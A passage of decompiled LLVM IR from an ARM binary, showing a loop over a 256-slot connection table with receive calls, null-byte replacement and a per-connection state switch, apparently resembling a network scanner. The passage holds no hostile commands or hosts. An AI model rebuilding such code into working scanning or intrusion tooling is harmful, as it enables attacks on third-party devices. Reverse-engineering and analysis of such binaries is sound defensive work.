  %v3_ed74 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_ed74, i32* %r3.global-to-local, align 4
  %v1_ed78 = add i32 %v3_ed74, 1
  store i32 %v1_ed78, i32* %r2.global-to-local, align 4
  %v2_ed7c = icmp ugt i32 %v1_ed78, 254
  store i1 %v2_ed7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ed7c = icmp eq i32 %v1_ed78, 255
  store i1 %v7_ed7c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ed78, i32* %stack_var_-52, align 4
  %v8_ed84 = icmp sgt i32 %v1_ed78, 255
  br i1 %v8_ed84, label %dec_label_pc_ee58, label %dec_label_pc_ed88

dec_label_pc_ed88:                                ; preds = %bb410, %dec_label_pc_ed2c
  %v0_ed94 = phi i32 [ %v1_ed78, %bb410 ], [ %v0_ed2c, %dec_label_pc_ed2c ]
  store i32 ptrtoint (i32* @global_var_2079c.131 to i32), i32* %r0.global-to-local, align 4
  %v3_ed8c = mul i32 %v0_ed94, 256
  store i32 %v3_ed8c, i32* %r3.global-to-local, align 4
  %v2_ed90 = load i32, i32* @global_var_2079c.131, align 4
  store i32 %v2_ed90, i32* %r1.global-to-local, align 4
  %v2_ed98 = mul i32 %v0_ed94, 288
  store i32 %v2_ed98, i32* %r2.global-to-local, align 4
  %v2_ed9c = add i32 %v2_ed90, %v2_ed98
  store i32 %v2_ed9c, i32* @r4, align 4
  %v1_eda0 = add i32 %v2_ed9c, 12
  %v2_eda0 = inttoptr i32 %v1_eda0 to i32*
  %v3_eda0 = load i32, i32* %v2_eda0, align 4
  store i32 %v3_eda0, i32* %ip.global-to-local, align 4
  %v2_eda4 = icmp ne i32 %v3_eda0, 0
  store i1 %v2_eda4, i1* %cpsr_c.global-to-local, align 1
  %v7_eda4 = icmp eq i32 %v3_eda0, 1
  store i1 %v7_eda4, i1* %cpsr_z.global-to-local, align 1
  %v2_eda8 = xor i1 %v2_eda4, true
  %v3_eda8 = or i1 %v7_eda4, %v2_eda8
  br i1 %v3_eda8, label %bb411, label %bb412

bb411:                                            ; preds = %dec_label_pc_ed88
  store i32 5, i32* %r1.global-to-local, align 4
  br label %bb412

bb412:                                            ; preds = %dec_label_pc_ed88, %bb411
  %v1_edc8215 = phi i32 [ %v2_ed90, %dec_label_pc_ed88 ], [ 5, %bb411 ]
  %v2_edac = xor i1 %v7_eda4, true
  %v3_edac = and i1 %v2_eda4, %v2_edac
  br i1 %v3_edac, label %bb413, label %bb414

bb413:                                            ; preds = %bb412
  store i32 30, i32* %r1.global-to-local, align 4
  br label %bb414

bb414:                                            ; preds = %bb412, %bb413
  %v1_edc8 = phi i32 [ %v1_edc8215, %bb412 ], [ 30, %bb413 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_edb0 = icmp eq i32 %v3_eda0, 0
  store i1 %v2_edb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edb0, label %bb410, label %dec_label_pc_edb8

dec_label_pc_edb8:                                ; preds = %bb414
  store i32 ptrtoint (i32* @global_var_1e74c.119 to i32), i32* %r2.global-to-local, align 4
  %v2_edbc = load i32, i32* @global_var_1e74c.119, align 4
  store i32 %v2_edbc, i32* %r3.global-to-local, align 4
  %v1_edc0 = add i32 %v2_ed9c, 8
  %v2_edc0 = inttoptr i32 %v1_edc0 to i32*
  %v3_edc0 = load i32, i32* %v2_edc0, align 4
  store i32 %v3_edc0, i32* %r2.global-to-local, align 4
  %v2_edc4 = sub i32 %v2_edbc, %v3_edc0
  store i32 %v2_edc4, i32* %r3.global-to-local, align 4
  %v3_edc8 = icmp uge i32 %v2_edc4, %v1_edc8
  store i1 %v3_edc8, i1* %cpsr_c.global-to-local, align 1
  %v9_edc8 = icmp eq i32 %v2_edc4, %v1_edc8
  store i1 %v9_edc8, i1* %cpsr_z.global-to-local, align 1
  %v2_edcc = xor i1 %v3_edc8, true
  %v3_edcc = or i1 %v9_edc8, %v2_edcc
  br i1 %v3_edcc, label %dec_label_pc_ed3c, label %dec_label_pc_edd0

dec_label_pc_edd0:                                ; preds = %dec_label_pc_edb8
  %v1_edd0 = add i32 %v2_ed9c, 4
  %v2_edd0 = inttoptr i32 %v1_edd0 to i32*
  %v3_edd0 = load i32, i32* %v2_edd0, align 4
  store i32 %v3_edd0, i32* %r0.global-to-local, align 4
  %v1_edd4 = call i32 @function_10be0(i32 %v3_edd0)
  store i32 %v1_edd4, i32* %r0.global-to-local, align 4
  %v0_edd8 = load i32, i32* @r4, align 4
  %v1_edd8 = add i32 %v0_edd8, 12
  %v2_edd8 = inttoptr i32 %v1_edd8 to i32*
  %v3_edd8 = load i32, i32* %v2_edd8, align 4
  store i32 %v3_edd8, i32* %r3.global-to-local, align 4
  %v2_eddc = icmp ugt i32 %v3_edd8, 1
  store i1 %v2_eddc, i1* %cpsr_c.global-to-local, align 1
  %v7_eddc = icmp eq i32 %v3_edd8, 2
  store i1 %v7_eddc, i1* %cpsr_z.global-to-local, align 1
  %v2_ede0 = xor i1 %v2_eddc, true
  %v3_ede0 = or i1 %v7_eddc, %v2_ede0
  br i1 %v3_ede0, label %bb415, label %.thread301

.thread301:                                       ; preds = %dec_label_pc_edd0
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ede8298302 = add i32 %v0_edd8, 4
  %v3_ede8299303 = inttoptr i32 %v2_ede8298302 to i32*
  store i32 -1, i32* %v3_ede8299303, align 4
  br label %bb416

bb415:                                            ; preds = %dec_label_pc_edd0
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ede8295 = add i32 %v0_edd8, 4
  %v3_ede8296 = inttoptr i32 %v2_ede8295 to i32*
  store i32 -1, i32* %v3_ede8296, align 4
  %v4_edec = load i32, i32* %r3.global-to-local, align 4
  %v5_edec = load i32, i32* @r4, align 4
  %v6_edec = add i32 %v5_edec, 12
  %v7_edec = inttoptr i32 %v6_edec to i32*
  store i32 %v4_edec, i32* %v7_edec, align 4
  %v4_edf0 = load i32, i32* %r3.global-to-local, align 4
  %v5_edf0 = trunc i32 %v4_edf0 to i8
  %v6_edf0 = load i32, i32* @r4, align 4
  %v7_edf0 = add i32 %v6_edf0, 284
  %v8_edf0 = inttoptr i32 %v7_edf0 to i8*
  store i8 %v5_edf0, i8* %v8_edf0, align 1
  %v0_edf4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_edf4.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb416

bb416:                                            ; preds = %.thread301, %bb415
  %v1_edf4 = phi i1 [ %v1_edf4.pre, %bb415 ], [ %v2_eddc, %.thread301 ]
  %v0_edf4 = phi i1 [ %v0_edf4.pre, %bb415 ], [ false, %.thread301 ]
  %v2_edf4 = xor i1 %v1_edf4, true
  %v3_edf4 = or i1 %v0_edf4, %v2_edf4
  br i1 %v3_edf4, label %bb410, label %dec_label_pc_edf8

dec_label_pc_edf8:                                ; preds = %bb416
  %v0_edf8 = load i32, i32* @r4, align 4
  %v1_edf8 = add i32 %v0_edf8, 284
  %v2_edf8 = inttoptr i32 %v1_edf8 to i8*
  %v3_edf8 = load i8, i8* %v2_edf8, align 1
  %v4_edf8 = zext i8 %v3_edf8 to i32
  %v1_edfc = add nuw nsw i32 %v4_edf8, 1
  %v1_ee00 = urem i32 %v1_edfc, 256
  store i32 %v1_ee00, i32* %r3.global-to-local, align 4
  %v2_ee04 = icmp ugt i32 %v1_ee00, 9
  store i1 %v2_ee04, i1* %cpsr_c.global-to-local, align 1
  %v7_ee04 = icmp eq i32 %v1_ee00, 10
  store i1 %v7_ee04, i1* %cpsr_z.global-to-local, align 1
  %v1_ee08 = trunc i32 %v1_edfc to i8
  store i8 %v1_ee08, i8* %v2_edf8, align 1
  %v0_ee0c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee0c, label %.thread75, label %dec_label_pc_ee1c

.thread75:                                        ; preds = %dec_label_pc_edf8
  %v1_ee0c = load i32, i32* %r3.global-to-local, align 4
  %v2_ee0c = add i32 %v1_ee0c, -10
  store i32 %v2_ee0c, i32* %r3.global-to-local, align 4
  %v2_ee10 = load i32, i32* @r4, align 4
  %v3_ee10 = add i32 %v2_ee10, 12
  %v4_ee10 = inttoptr i32 %v3_ee10 to i32*
  store i32 %v2_ee0c, i32* %v4_ee10, align 4
  %v1_ee14 = load i32, i32* %r3.global-to-local, align 4
  %v2_ee14 = trunc i32 %v1_ee14 to i8
  %v3_ee14 = load i32, i32* @r4, align 4
  %v4_ee14 = add i32 %v3_ee14, 284
  %v5_ee14 = inttoptr i32 %v4_ee14 to i8*
  store i8 %v2_ee14, i8* %v5_ee14, align 1
  %v0_ee18.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee18.pr.pr, label %bb410, label %dec_label_pc_ee1c

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_edf8, %.thread75
  %v0_ee1c = load i32, i32* @r4, align 4
  store i32 %v0_ee1c, i32* @r0, align 4
  %v0_ee20 = call i32 @function_e304()
  store i32 %v0_ee20, i32* %r0.global-to-local, align 4
  br label %bb410

dec_label_pc_ee28:                                ; preds = %dec_label_pc_ed3c
  store i32 %v3_ee28, i32* %r0.global-to-local, align 4
  %v3_ee2c = udiv i32 %v3_ee28, 32
  %v3_ee30 = mul nuw nsw i32 %v3_ee2c, 4
  store i32 %v2_ee34, i32* @lr, align 4
  %v2_ee38 = add i32 %v3_ee30, %v2_ee34
  store i32 %v2_ee38, i32* %r3.global-to-local, align 4
  %v1_ee3c = add i32 %v2_ee38, -312
  %v2_ee3c = inttoptr i32 %v1_ee3c to i32*
  %v3_ee3c = load i32, i32* %v2_ee3c, align 4
  %v1_ee40 = urem i32 %v3_ee28, 32
  store i32 %v1_ee40, i32* %r1.global-to-local, align 4
  %v7_ee44 = shl i32 1, %v1_ee40
  %v8_ee44 = or i32 %v3_ee3c, %v7_ee44
  store i32 %v8_ee44, i32* %r2.global-to-local, align 4
  %v0_ee48 = load i32, i32* @r5, align 4
  %v3_ee48 = icmp uge i32 %v0_ee48, %v3_ee28
  store i1 %v3_ee48, i1* %cpsr_c.global-to-local, align 1
  %v9_ee48 = icmp eq i32 %v0_ee48, %v3_ee28
  store i1 %v9_ee48, i1* %cpsr_z.global-to-local, align 1
  %v5_ee4c = icmp slt i32 %v0_ee48, %v3_ee28
  br i1 %v5_ee4c, label %bb417, label %bb418

bb417:                                            ; preds = %dec_label_pc_ee28
  store i32 %v3_ee28, i32* @r5, align 4
  br label %bb418

bb418:                                            ; preds = %dec_label_pc_ee28, %bb417
  store i32 %v8_ee44, i32* %v2_ee3c, align 4
  br label %bb410

dec_label_pc_ee58:                                ; preds = %bb410
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_ee64 = load i32, i32* @r5, align 4
  %v1_ee64 = load i32, i32* @r6, align 4
  %v3_ee64 = icmp uge i32 %v0_ee64, %v1_ee64
  store i1 %v3_ee64, i1* %cpsr_c.global-to-local, align 1
  %v9_ee64 = icmp eq i32 %v0_ee64, %v1_ee64
  store i1 %v9_ee64, i1* %cpsr_z.global-to-local, align 1
  %v5_ee68 = icmp slt i32 %v0_ee64, %v1_ee64
  %storemerge155 = select i1 %v5_ee68, i32 %v1_ee64, i32 %v0_ee64
  store i32 %v2_ee7c, i32* %ip.global-to-local, align 4
  store i32 %v2_ee80, i32* %r1.global-to-local, align 4
  store i32 %v2_ee84, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ee8c = add i32 %storemerge155, 1
  store i32 %v1_ee8c, i32* %r0.global-to-local, align 4
  %v5_ee98 = call i32 @function_10904(i32 %v1_ee8c, i32 %v2_ee80, i32 %v2_ee84, i32 0, i32 %v2_ee7c)
  %v0_ee9c = load i32, i32* @r4, align 4
  store i32 %v0_ee9c, i32* %r0.global-to-local, align 4
  %v1_eea0 = inttoptr i32 %v0_ee9c to i32*
  %v2_eea0 = call i32 @function_10860(i32* %v1_eea0)
  store i32 %v2_eea0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e74c.119 to i32), i32* @lr, align 4
  %v0_eea8 = load i32, i32* @r4, align 4
  store i32 %v0_eea8, i32* %stack_var_-52, align 4
  store i32 %v2_eea0, i32* @global_var_1e74c.119, align 4
  br label %dec_label_pc_eeb0

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_f018, %dec_label_pc_ee58
  %v0_eebc = phi i32 [ %v1_f01c, %dec_label_pc_f018 ], [ %v0_eea8, %dec_label_pc_ee58 ]
  store i32 ptrtoint (i32* @global_var_2079c.131 to i32), i32* %r0.global-to-local, align 4
  %v3_eeb4 = mul i32 %v0_eebc, 256
  store i32 %v3_eeb4, i32* %r3.global-to-local, align 4
  %v2_eeb8 = load i32, i32* @global_var_2079c.131, align 4
  store i32 %v2_eeb8, i32* %r1.global-to-local, align 4
  %v2_eec0 = mul i32 %v0_eebc, 288
  store i32 %v2_eec0, i32* %r2.global-to-local, align 4
  %v2_eec4 = add i32 %v2_eeb8, %v2_eec0
  store i32 %v2_eec4, i32* @r6, align 4
  %v1_eec8 = add i32 %v2_eec4, 4
  %v2_eec8 = inttoptr i32 %v1_eec8 to i32*
  %v3_eec8 = load i32, i32* %v2_eec8, align 4
  store i32 %v3_eec8, i32* %r0.global-to-local, align 4
  %v2_eecc = icmp eq i32 %v3_eec8, -1
  store i1 %v2_eecc, i1* %cpsr_c.global-to-local, align 1
  %v7_eecc = icmp eq i32 %v3_eec8, -1
  store i1 %v7_eecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eecc, label %dec_label_pc_f018, label %dec_label_pc_eed4

dec_label_pc_eed4:                                ; preds = %dec_label_pc_eeb0
  %v3_eed4 = udiv i32 %v3_eec8, 32
  store i32 %v2_ee34, i32* %r1.global-to-local, align 4
  %v3_eedc = mul nuw nsw i32 %v3_eed4, 4
  store i32 %v3_eedc, i32* @ip, align 4
  %v2_eee0 = add i32 %v3_eedc, %v2_ee34
  store i32 %v2_eee0, i32* %r2.global-to-local, align 4
  %v1_eee4 = add i32 %v2_eee0, -312
  %v2_eee4 = inttoptr i32 %v1_eee4 to i32*
  %v3_eee4 = load i32, i32* %v2_eee4, align 4
  %v1_eee8 = urem i32 %v3_eec8, 32
  store i32 %v1_eee8, i32* %r1.global-to-local, align 4
  %v2_eeec = add nsw i32 %v1_eee8, -1
  %v3_eeec = shl i32 1, %v2_eeec
  %v4_eeec = and i32 %v3_eee4, %v3_eeec
  %v5_eeec = icmp ne i32 %v4_eeec, 0
  store i1 %v5_eeec, i1* %cpsr_c.global-to-local, align 1
  %v6_eeec = lshr i32 %v3_eee4, %v1_eee8
  store i32 %v6_eeec, i32* %r3.global-to-local, align 4
  %v1_eef0 = urem i32 %v6_eeec, 2
  %v2_eef0 = icmp eq i32 %v1_eef0, 0
  store i1 %v2_eef0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eef0, label %dec_label_pc_eef8, label %dec_label_pc_fa20

dec_label_pc_eef8:                                ; preds = %dec_label_pc_eed4, %dec_label_pc_facc
  %v1_ef04 = phi i32 [ %v1_eee8, %dec_label_pc_eed4 ], [ %v1_ef04.pre, %dec_label_pc_facc ]
  %v0_eefc = phi i32 [ %v3_eedc, %dec_label_pc_eed4 ], [ %v0_eefc.pre, %dec_label_pc_facc ]
  store i32 %v2_ee34, i32* @lr, align 4
  %v2_eefc = add i32 %v0_eefc, %v2_ee34
  store i32 %v2_eefc, i32* %r2.global-to-local, align 4
  %v1_ef00 = add i32 %v2_eefc, -184
  %v2_ef00 = inttoptr i32 %v1_ef00 to i32*
  %v3_ef00 = load i32, i32* %v2_ef00, align 4
  %v2_ef04 = add i32 %v1_ef04, -1
  %v3_ef04 = shl i32 1, %v2_ef04
  %v4_ef04 = and i32 %v3_ef00, %v3_ef04
  %v5_ef04 = icmp ne i32 %v4_ef04, 0
  store i1 %v5_ef04, i1* %cpsr_c.global-to-local, align 1
  %v6_ef04 = lshr i32 %v3_ef00, %v1_ef04
  store i32 %v6_ef04, i32* %r3.global-to-local, align 4
  %v1_ef08 = urem i32 %v6_ef04, 2
  %v2_ef08 = icmp eq i32 %v1_ef08, 0
  store i1 %v2_ef08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef08, label %dec_label_pc_f018, label %dec_label_pc_ef10.preheader

dec_label_pc_ef10.preheader:                      ; preds = %dec_label_pc_eef8
  %v0_ef10176 = load i32, i32* @r6, align 4
  %v1_ef10177 = add i32 %v0_ef10176, 12
  %v2_ef10178 = inttoptr i32 %v1_ef10177 to i32*
  %v3_ef10179 = load i32, i32* %v2_ef10178, align 4
  store i32 %v3_ef10179, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef14175181 = icmp eq i32 %v3_ef10179, 0
  store i1 %v2_ef14175181, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef14175181, label %dec_label_pc_f018, label %dec_label_pc_ef1c.lr.ph

dec_label_pc_ef10.loopexit:                       ; preds = %dec_label_pc_f924, %dec_label_pc_f728
  %v0_ef10 = load i32, i32* @r6, align 4
  %v1_ef10 = add i32 %v0_ef10, 12
  %v2_ef10 = inttoptr i32 %v1_ef10 to i32*
  %v3_ef10 = load i32, i32* %v2_ef10, align 4
  store i32 %v3_ef10, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef14175 = icmp eq i32 %v3_ef10, 0
  store i1 %v2_ef14175, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef14175, label %dec_label_pc_f018, label %dec_label_pc_ef1c.lr.ph

dec_label_pc_ef1c.lr.ph:                          ; preds = %dec_label_pc_ef10.preheader, %dec_label_pc_ef10.loopexit
  %v0_ef1c231 = phi i32 [ %v0_ef10, %dec_label_pc_ef10.loopexit ], [ %v0_ef10176, %dec_label_pc_ef10.preheader ]
  br label %dec_label_pc_ef1c

dec_label_pc_ef1c:                                ; preds = %dec_label_pc_ef14.backedge.thread, %dec_label_pc_ef14.backedge, %dec_label_pc_ef14.backedge.thread561, %dec_label_pc_ef1c.lr.ph
  %v0_f9f0 = phi i32 [ %v0_ef1c231, %dec_label_pc_ef1c.lr.ph ], [ %v0_ef1c228, %dec_label_pc_ef14.backedge ], [ %v0_ef90, %dec_label_pc_ef14.backedge.thread ], [ %v0_ef90, %dec_label_pc_ef14.backedge.thread561 ]
  %v1_ef1c = add i32 %v0_f9f0, 24
  %v2_ef1c = inttoptr i32 %v1_ef1c to i32*
  %v3_ef1c = load i32, i32* %v2_ef1c, align 4
  store i32 %v3_ef1c, i32* @r3, align 4
  %v2_ef20 = icmp ugt i32 %v3_ef1c, 255
  store i1 %v2_ef20, i1* %cpsr_c.global-to-local, align 1
  %v7_ef20 = icmp eq i32 %v3_ef1c, 256
  store i1 %v7_ef20, i1* %cpsr_z.global-to-local, align 1
  %.pre282 = add i32 %v0_f9f0, 28
  store i32 %.pre282, i32* %sb.global-to-local, align 4
  br i1 %v7_ef20, label %dec_label_pc_f9f0, label %dec_label_pc_ef2c

dec_label_pc_ef2c:                                ; preds = %dec_label_pc_ef1c, %dec_label_pc_f9f0
  store i32 0, i32* @r5, align 4
  %v1_ef30 = load i32, i32* %fp.global-to-local, align 4
  %v2_ef30 = inttoptr i32 %v1_ef30 to i32*
  store i32 0, i32* %v2_ef30, align 4
  %v0_ef34 = load i32, i32* @r6, align 4
  %v1_ef34 = add i32 %v0_ef34, 24
  %v2_ef34 = inttoptr i32 %v1_ef34 to i32*
  %v3_ef34 = load i32, i32* %v2_ef34, align 4
  store i32 %v3_ef34, i32* %r2.global-to-local, align 4
  %v0_ef38 = load i32, i32* %sb.global-to-local, align 4
  %v2_ef38 = add i32 %v0_ef38, %v3_ef34
  store i32 %v2_ef38, i32* @r4, align 4
  %v1_ef3c = add i32 %v0_ef34, 4
  %v2_ef3c = inttoptr i32 %v1_ef3c to i32*
  %v3_ef3c = load i32, i32* %v2_ef3c, align 4
  store i32 %v3_ef3c, i32* %r0.global-to-local, align 4
  %v1_ef40 = sub i32 256, %v3_ef34
  store i32 %v1_ef40, i32* %r2.global-to-local, align 4
  store i32 %v2_ef38, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ef4c = call i32 @function_1128c(i32 %v3_ef3c, i32 %v2_ef38, i32 %v1_ef40, i32 16384)
  store i32 %v4_ef4c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef50 = icmp eq i32 %v4_ef4c, 0
  store i1 %v2_ef50, i1* %cpsr_z.global-to-local, align 1
  %tmp419 = icmp slt i32 %v4_ef4c, 1
  br i1 %tmp419, label %dec_label_pc_efc8, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %dec_label_pc_ef2c
  %v0_ef58 = load i32, i32* @r5, align 4
  store i32 %v0_ef58, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef5c

dec_label_pc_ef5c:                                ; preds = %.thread82, %dec_label_pc_ef58
  %v3_ef68 = phi i32 [ %v1_ef6c, %.thread82 ], [ %v0_ef58, %dec_label_pc_ef58 ]
  %v1_ef5c = load i32, i32* @r4, align 4
  %v2_ef5c = add i32 %v1_ef5c, %v3_ef68
  %v3_ef5c = inttoptr i32 %v2_ef5c to i8*
  %v4_ef5c = load i8, i8* %v3_ef5c, align 1
  %v6_ef5c = zext i8 %v4_ef5c to i32
  store i32 %v6_ef5c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef60 = icmp eq i8 %v4_ef5c, 0
  store i1 %v2_ef60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef60, label %bb420, label %.thread82

bb420:                                            ; preds = %dec_label_pc_ef5c
  %v2_ef64 = add nuw nsw i32 %v6_ef5c, 65
  store i32 %v2_ef64, i32* %r3.global-to-local, align 4
  %v2_ef68 = trunc i32 %v2_ef64 to i8
  store i8 %v2_ef68, i8* %v3_ef5c, align 1
  %v0_ef6c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.thread82

.thread82:                                        ; preds = %dec_label_pc_ef5c, %bb420
  %v0_ef6c = phi i32 [ %v3_ef68, %dec_label_pc_ef5c ], [ %v0_ef6c.pre, %bb420 ]
  %v1_ef6c = add i32 %v0_ef6c, 1
  store i32 %v1_ef6c, i32* %r2.global-to-local, align 4
  %v3_ef70 = icmp uge i32 %v1_ef6c, %v4_ef4c
  store i1 %v3_ef70, i1* %cpsr_c.global-to-local, align 1
  %v9_ef70 = icmp eq i32 %v1_ef6c, %v4_ef4c
  store i1 %v9_ef70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ef70, label %dec_label_pc_ef78, label %dec_label_pc_ef5c

dec_label_pc_ef78:                                ; preds = %.thread82, %dec_label_pc_efcc
  store i32 ptrtoint (i32* @global_var_1e74c.119 to i32), i32* %r1.global-to-local, align 4
  %v0_ef7c = load i32, i32* @r6, align 4
  %v1_ef7c = add i32 %v0_ef7c, 24
  %v2_ef7c = inttoptr i32 %v1_ef7c to i32*
  %v3_ef7c = load i32, i32* %v2_ef7c, align 4
  %v2_ef80 = load i32, i32* @global_var_1e74c.119, align 4
  store i32 %v2_ef80, i32* %r2.global-to-local, align 4
  %v2_ef84 = add i32 %v3_ef7c, %v4_ef4c
  store i32 %v2_ef84, i32* %r3.global-to-local, align 4
  store i32 %v2_ef84, i32* %v2_ef7c, align 4
  %v0_ef8c = load i32, i32* %r2.global-to-local, align 4
  %v1_ef8c = load i32, i32* @r6, align 4
  %v2_ef8c = add i32 %v1_ef8c, 8
  %v3_ef8c = inttoptr i32 %v2_ef8c to i32*
  store i32 %v0_ef8c, i32* %v3_ef8c, align 4
  br label %dec_label_pc_ef90

dec_label_pc_ef90:                                ; preds = %dec_label_pc_f0ac, %dec_label_pc_ef78
  %v0_ef90 = load i32, i32* @r6, align 4
  %v1_ef90 = add i32 %v0_ef90, 12
  %v2_ef90 = inttoptr i32 %v1_ef90 to i32*
  %v3_ef90 = load i32, i32* %v2_ef90, align 4
  store i32 %v3_ef90, i32* %r0.global-to-local, align 4
  %v1_ef94 = add i32 %v3_ef90, -2
  store i32 %v1_ef94, i32* @r3, align 4
  %v7_ef98 = icmp eq i32 %v1_ef94, 8
  store i1 %v7_ef98, i1* %cpsr_z.global-to-local, align 1
  %v5_ef9c = and i32 %v1_ef94, 1073741824
  %v6_ef9c = icmp ne i32 %v5_ef9c, 0
  store i1 %v6_ef9c, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_ef90, label %dec_label_pc_ef14.backedge [
    i32 2, label %dec_label_pc_f27c
    i32 3, label %dec_label_pc_f734
    i32 4, label %dec_label_pc_f640
    i32 5, label %dec_label_pc_f420
    i32 6, label %dec_label_pc_f34c
    i32 7, label %dec_label_pc_f56c
    i32 8, label %dec_label_pc_f1a8
    i32 9, label %dec_label_pc_f0d4
    i32 10, label %dec_label_pc_f030
  ]

dec_label_pc_efc8:                                ; preds = %dec_label_pc_ef2c
  br i1 %v2_ef50, label %dec_label_pc_fb20, label %dec_label_pc_efcc

dec_label_pc_efcc:                                ; preds = %dec_label_pc_efc8
  %v3_efcc = icmp eq i32 %v4_ef4c, -1
  store i1 %v3_efcc, i1* %cpsr_c.global-to-local, align 1
  %v8_efcc = icmp eq i32 %v4_ef4c, -1
  store i1 %v8_efcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_efcc, label %dec_label_pc_efd4, label %dec_label_pc_ef78

dec_label_pc_efd4:                                ; preds = %dec_label_pc_efcc
  %v0_efd4 = load i32, i32* %fp.global-to-local, align 4
  %v1_efd4 = inttoptr i32 %v0_efd4 to i32*
  %v2_efd4 = load i32, i32* %v1_efd4, align 4
  store i32 %v2_efd4, i32* %r3.global-to-local, align 4
  %v2_efd8 = icmp ugt i32 %v2_efd4, 10
  store i1 %v2_efd8, i1* %cpsr_c.global-to-local, align 1
  %v7_efd8 = icmp eq i32 %v2_efd4, 11
  store i1 %v7_efd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efd8, label %dec_label_pc_f018, label %dec_label_pc_efe0

dec_label_pc_efe0:                                ; preds = %dec_label_pc_efd4, %dec_label_pc_fb20
  %v0_efe0 = load i32, i32* @r6, align 4
  %v1_efe0 = add i32 %v0_efe0, 4
  %v2_efe0 = inttoptr i32 %v1_efe0 to i32*
  %v3_efe0 = load i32, i32* %v2_efe0, align 4
  store i32 %v3_efe0, i32* %r0.global-to-local, align 4
  %v1_efe4 = call i32 @function_10be0(i32 %v3_efe0)
  store i32 %v1_efe4, i32* %r0.global-to-local, align 4
  %v0_efe8 = load i32, i32* @r6, align 4
  %v1_efe8 = add i32 %v0_efe8, 284
  %v2_efe8 = inttoptr i32 %v1_efe8 to i8*
  %v3_efe8 = load i8, i8* %v2_efe8, align 1
  %v4_efe8 = zext i8 %v3_efe8 to i32
  %v1_efec = add nuw nsw i32 %v4_efe8, 1
  %v1_eff0 = urem i32 %v1_efec, 256
  store i32 %v1_eff0, i32* %r3.global-to-local, align 4
  %v2_eff4 = icmp ugt i32 %v1_eff0, 8
  store i1 %v2_eff4, i1* %cpsr_c.global-to-local, align 1
  %v7_eff4 = icmp eq i32 %v1_eff0, 9
  store i1 %v7_eff4, i1* %cpsr_z.global-to-local, align 1
  %v1_eff8 = trunc i32 %v1_efec to i8
  store i8 %v1_eff8, i8* %v2_efe8, align 1
  store i32 -1, i32* %r2.global-to-local, align 4
  %v0_f000 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_f000 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_f000 = xor i1 %v1_f000, true
  %v3_f000 = and i1 %v0_f000, %v2_f000
  br i1 %v3_f000, label %bb421, label %.thread313

.thread313:                                       ; preds = %dec_label_pc_efe0
  %v1_f004309314 = load i32, i32* @r6, align 4
  %v2_f004310315 = add i32 %v1_f004309314, 4
  %v3_f004311316 = inttoptr i32 %v2_f004310315 to i32*
  store i32 -1, i32* %v3_f004311316, align 4
  br label %bb422

bb421:                                            ; preds = %dec_label_pc_efe0
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f004305 = load i32, i32* @r6, align 4
  %v2_f004306 = add i32 %v1_f004305, 4
  %v3_f004307 = inttoptr i32 %v2_f004306 to i32*
  store i32 -1, i32* %v3_f004307, align 4
  %v4_f008 = load i32, i32* %r3.global-to-local, align 4
  %v5_f008 = load i32, i32* @r6, align 4
  %v6_f008 = add i32 %v5_f008, 12
  %v7_f008 = inttoptr i32 %v6_f008 to i32*
  store i32 %v4_f008, i32* %v7_f008, align 4
  %v4_f00c = load i32, i32* %r3.global-to-local, align 4
  %v5_f00c = trunc i32 %v4_f00c to i8
  %v6_f00c = load i32, i32* @r6, align 4
  %v7_f00c = add i32 %v6_f00c, 284
  %v8_f00c = inttoptr i32 %v7_f00c to i8*
  store i8 %v5_f00c, i8* %v8_f00c, align 1
  %v0_f010.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f010.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb422

bb422:                                            ; preds = %.thread313, %bb421
  %v1_f014 = phi i1 [ %v1_f010.pre, %bb421 ], [ %v0_f000, %.thread313 ]
  %v0_f014 = phi i1 [ %v0_f010.pre, %bb421 ], [ %v1_f000, %.thread313 ]
  %v2_f010 = xor i1 %v1_f014, true
  %v3_f010 = or i1 %v0_f014, %v2_f010
  br i1 %v3_f010, label %bb423, label %bb424

bb423:                                            ; preds = %bb422
  %v4_f010 = load i32, i32* @r6, align 4
